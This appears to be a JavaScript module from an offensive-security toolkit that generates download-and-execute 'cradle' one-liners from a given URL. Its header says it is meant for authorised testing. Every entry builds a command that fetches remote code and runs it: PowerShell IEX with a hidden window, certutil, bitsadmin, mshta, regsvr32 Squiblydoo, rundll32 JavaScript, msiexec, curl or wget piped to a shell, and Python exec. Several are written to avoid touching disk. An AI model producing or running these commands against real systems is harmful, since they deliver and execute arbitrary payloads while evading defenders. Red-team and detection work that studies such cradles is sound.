// Download-and-run "cradle" builder — the well-known living-off-the-land one-liners that
// fetch a file over HTTP and run it. Same public material as the LOLbins lookup, built from
// a URL. For authorised testing; your host has to actually serve the file.

const drop = (url, ext) => { const b = (url.split('/').pop() || '').split('?')[0]; return b && b.includes('.') ? b : 'a.' + ext; };

export const CRADLES = [
  { id: 'ps-iex', os: 'win', name: 'PowerShell IEX (in-memory)', note: 'runs a .ps1 without touching disk',
    build: (u) => `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${u}')"` },
  { id: 'ps-iwr', os: 'win', name: 'PowerShell IWR | IEX', note: 'newer cmdlet form',
    build: (u) => `powershell -nop -c "IEX(IWR -UseBasicParsing '${u}')"` },
  { id: 'ps-download', os: 'win', name: 'PowerShell DownloadFile + run', note: 'drops to %TEMP% then runs',
    build: (u) => `powershell -nop -c "$f='$env:TEMP\\\\${drop(u, 'exe')}';(New-Object Net.WebClient).DownloadFile('${u}',$f);Start-Process $f"` },
  { id: 'certutil', os: 'win', name: 'certutil', note: 'classic LOLBin; noisy, often flagged',
    build: (u) => `certutil -urlcache -split -f "${u}" ${drop(u, 'exe')} & ${drop(u, 'exe')}` },
  { id: 'bitsadmin', os: 'win', name: 'bitsadmin', note: 'background transfer',
    build: (u) => `bitsadmin /transfer j /download /priority high "${u}" %TEMP%\\${drop(u, 'exe')} & %TEMP%\\${drop(u, 'exe')}` },
  { id: 'curl-win', os: 'win', name: 'curl.exe (Win10+)', note: '',
    build: (u) => `curl.exe -o %TEMP%\\${drop(u, 'exe')} "${u}" && %TEMP%\\${drop(u, 'exe')}` },
  { id: 'mshta', os: 'win', name: 'mshta', note: 'runs an HTA directly from the URL',
    build: (u) => `mshta ${u}` },
  { id: 'regsvr32', os: 'win', name: 'regsvr32 (Squiblydoo)', note: 'runs a remote scriptlet (.sct)',
    build: (u) => `regsvr32 /s /n /u /i:${u} scrobj.dll` },
  { id: 'rundll32-js', os: 'win', name: 'rundll32 JavaScript', note: 'no file written',
    build: (u) => `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:${u}")` },
  { id: 'msiexec', os: 'win', name: 'msiexec', note: 'installs a remote MSI',
    build: (u) => `msiexec /q /i ${u}` },
  { id: 'wget', os: 'nix', name: 'wget + chmod + run', note: '',
    build: (u) => `wget -qO /tmp/${drop(u, 'bin')} "${u}" && chmod +x /tmp/${drop(u, 'bin')} && /tmp/${drop(u, 'bin')}` },
  { id: 'curl-nix', os: 'nix', name: 'curl | sh (in-memory)', note: 'pipes a script straight to the shell',
    build: (u) => `curl -fsSL "${u}" | sh` },
  { id: 'curl-bash', os: 'nix', name: 'curl | bash', note: '',
    build: (u) => `bash -c "$(curl -fsSL ${u})"` },
  { id: 'python-nix', os: 'nix', name: 'python fetch + exec', note: '',
    build: (u) => `python3 -c "import urllib.request as r,os;open('/tmp/${drop(u, 'bin')}','wb').write(r.urlopen('${u}').read());os.system('chmod +x /tmp/${drop(u, 'bin')};/tmp/${drop(u, 'bin')}')"` },
];
